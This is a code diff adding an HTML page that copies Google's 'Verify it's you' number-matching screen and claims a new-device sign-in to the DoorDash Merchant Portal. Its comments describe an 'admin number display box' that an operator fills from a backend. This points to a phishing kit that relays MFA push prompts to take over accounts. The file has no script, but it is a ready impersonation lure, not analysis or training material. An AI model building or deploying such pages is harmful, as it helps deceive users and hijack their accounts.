@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify it's you - Google Account</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 24px;
+            color: #202124;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 448px;
+            background: #ffffff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            text-align: center;
+            position: relative;
+            min-height: 500px;
+        }
+
+        /* ---------- AUTH VIEW ---------- */
+        .auth-view.hidden {
+            display: none;
+        }
+
+        .google-logo {
+            width: 75px;
+            height: auto;
+            margin-bottom: 16px;
+        }
+
+        .heading {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 12px;
+        }
+
+        .subheading {
+            font-size: 15px;
+            color: #5f6368;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .subheading strong {
+            color: #202124;
+            font-weight: 500;
+        }
+
+        /* Device illustration (Google-style two-factor / device prompt) */
+        .device-illustration {
+            margin: 8px auto 28px;
+            width: 200px;
+            height: 150px;
+        }
+
+        /* Prompt card */
+        .prompt-card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 20px 20px 16px;
+            text-align: left;
+            margin-bottom: 24px;
+        }
+
+        .prompt-card .prompt-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #202124;
+            margin-bottom: 6px;
+        }
+
+        .prompt-card .prompt-desc {
+            font-size: 13px;
+            color: #5f6368;
+            line-height: 1.5;
+            margin-bottom: 14px;
+        }
+
+        .prompt-card .prompt-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #3c4043;
+        }
+
+        .prompt-card .prompt-row svg {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+            color: #1a73e8;
+        }
+
+        /* ---------- ADMIN NUMBER DISPLAY BOX ---------- */
+        .admin-number-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 16px 0 28px;
+        }
+
+        .admin-number-box .number-display {
+            font-size: 52px;
+            font-weight: 500;
+            letter-spacing: 8px;
+            color: #1a73e8;
+            background: #f8fbff;
+            border: 2px dashed #1a73e8;
+            border-radius: 12px;
+            padding: 16px 28px 16px 36px;
+            min-width: 220px;
+            text-align: center;
+            font-variant-numeric: tabular-nums;
+            line-height: 1.2;
+            transition: all 0.15s ease;
+            /* placeholder state – empty until backend fills it */
+            color: #1a73e8;
+        }
+
+        /* When the number is empty (before admin sets it) we show a subtle placeholder */
+        .admin-number-box .number-display.empty {
+            color: #9aa0a6;
+            border-color: #dadce0;
+            background: #fafafa;
+            font-size: 20px;
+            font-weight: 400;
+            letter-spacing: normal;
+            padding: 20px 28px;
+            font-style: italic;
+        }
+
+        .admin-number-box .number-hint {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 10px;
+            letter-spacing: 0.3px;
+        }
+
+        /* Actions */
+        .actions {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            margin-top: 8px;
+        }
+
+        .back-link {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1a73e8;
+            text-decoration: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px 8px;
+            border-radius: 4px;
+            font-family: inherit;
+        }
+
+        .back-link:hover {
+            background: #f6f8fa;
+        }
+
+        .verify-btn {
+            background: #1a73e8;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            cursor: pointer;
+            transition: background 0.15s ease, opacity 0.15s ease;
+            min-width: 88px;
+            font-family: inherit;
+        }
+
+        .verify-btn:hover {
+            background: #1765cc;
+        }
+
+        .verify-btn:disabled {
+            background: #e8eaed;
+            color: #9aa0a6;
+            cursor: not-allowed;
+        }
+
+        /* ---------- LOADING VIEW ---------- */
+        .loading-view {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 0 40px;
+            min-height: 400px;
+        }
+
+        .loading-view.visible {
+            display: flex;
+        }
+
+        .loading-view .google-logo {
+            margin-bottom: 40px;
+        }
+
+        .g-spinner {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 28px;
+            animation: g-spin 1.4s linear infinite;
+        }
+
+        .g-spinner .track {
+            stroke: #e8eaed;
+        }
+
+        .g-spinner .arc {
+            stroke: #1a73e8;
+            stroke-linecap: round;
+            animation: g-dash 1.4s ease-in-out infinite;
+        }
+
+        @keyframes g-spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes g-dash {
+            0% {
+                stroke-dasharray: 1, 150;
+                stroke-dashoffset: 0;
+            }
+            50% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -35;
+            }
+            100% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -124;
+            }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            color: #202124;
+            font-weight: 400;
+            text-align: center;
+        }
+
+        .footer-lang {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 48px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer-lang select {
+            background: none;
+            border: none;
+            font-size: 12px;
+            color: #5f6368;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 16px;
+            margin-top: 8px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                border: none;
+                padding: 24px 0;
+                max-width: 100%;
+            }
+            .device-illustration {
+                width: 160px;
+                height: 120px;
+            }
+            .admin-number-box .number-display {
+                font-size: 40px;
+                padding: 12px 20px 12px 28px;
+                min-width: 160px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+
+        <!-- ================= AUTH VIEW ================= -->
+        <div class="auth-view" id="authView">
+            <svg class="google-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+
+            <h1 class="heading">Verify it's you</h1>
+            <p class="subheading">
+                A sign-in attempt was made from a new device.<br>
+                Confirm it's you to continue to <strong>DoorDash Merchant Portal</strong>.
+            </p>
+
+            <!-- Device illustration -->
+            <svg class="device-illustration" viewBox="0 0 200 150" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <rect x="20" y="110" width="160" height="10" rx="3" fill="#dadce0"/>
+                <rect x="45" y="30" width="110" height="80" rx="4" fill="#f1f3f4" stroke="#dadce0" stroke-width="2"/>
+                <path d="M100 48 L86 54 L86 68 C86 76 92 82 100 85 C108 82 114 76 114 68 L114 54 Z" fill="#1a73e8"/>
+                <path d="M94 66 L98 70 L107 61" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                <rect x="60" y="95" width="80" height="4" rx="2" fill="#e8eaed"/>
+                <rect x="155" y="75" width="26" height="42" rx="4" fill="#ffffff" stroke="#dadce0" stroke-width="2"/>
+                <circle cx="168" cy="111" r="2" fill="#dadce0"/>
+                <rect x="160" y="82" width="16" height="2" rx="1" fill="#1a73e8"/>
+                <rect x="160" y="88" width="16" height="2" rx="1" fill="#e8eaed"/>
+                <rect x="160" y="94" width="10" height="2" rx="1" fill="#e8eaed"/>
+            </svg>
+
+            <!-- Prompt card -->
+            <div class="prompt-card">
+                <div class="prompt-title">Confirm the number on your device</div>
+                <div class="prompt-desc">
+                    Open the Google app on your phone and tap the number that matches the one below.
+                </div>
+                <div class="prompt-row">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="5" y="2" width="14" height="20" rx="3" stroke="currentColor" stroke-width="1.8"/>
+                        <line x1="10" y1="18" x2="14" y2="18" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                    </svg>
+                    <span>Check your phone for a Google prompt</span>
+                </div>
+            </div>
+
+            <!-- ===== ADMIN NUMBER DISPLAY BOX (empty by default) ===== -->
+           <div class="admin-number-box" id="adminNumberBox">
+          <div
+            class="number-display empty"
+            id="adminNumberDisplay"
+            data-number=""
+            data-deuce-push-value
+              ></div>
+        </div>
+            <div class="actions">
+                <button class="back-link" id="backBtn" type="button">Back</button>
+                <button class="verify-btn" id="verifyBtn" type="button" disabled>Verify</button>
+            </div>
+
+            <div class="footer-lang">
+                <select aria-label="Change language">
+                    <option>English (United States)</option>
+                    <option>Français (Canada)</option>
+                    <option>Español</option>
+                </select>
+                <div class="footer-links">
+                    <a href="#">Help</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= LOADING VIEW ================= -->
+        <div class="loading-view" id="loadingView">
+            <svg class="google-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+
+            <svg class="g-spinner" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
+                <circle class="track" cx="25" cy="25" r="20" fill="none" stroke-width="4"/>
+                <circle class="arc" cx="25" cy="25" r="20" fill="none" stroke-width="4"/>
+            </svg>
+
+            <p class="loading-text" id="loadingText">Verifying…</p>
+        </div>
+
+    </div>
+
+
+</body>
+</html>
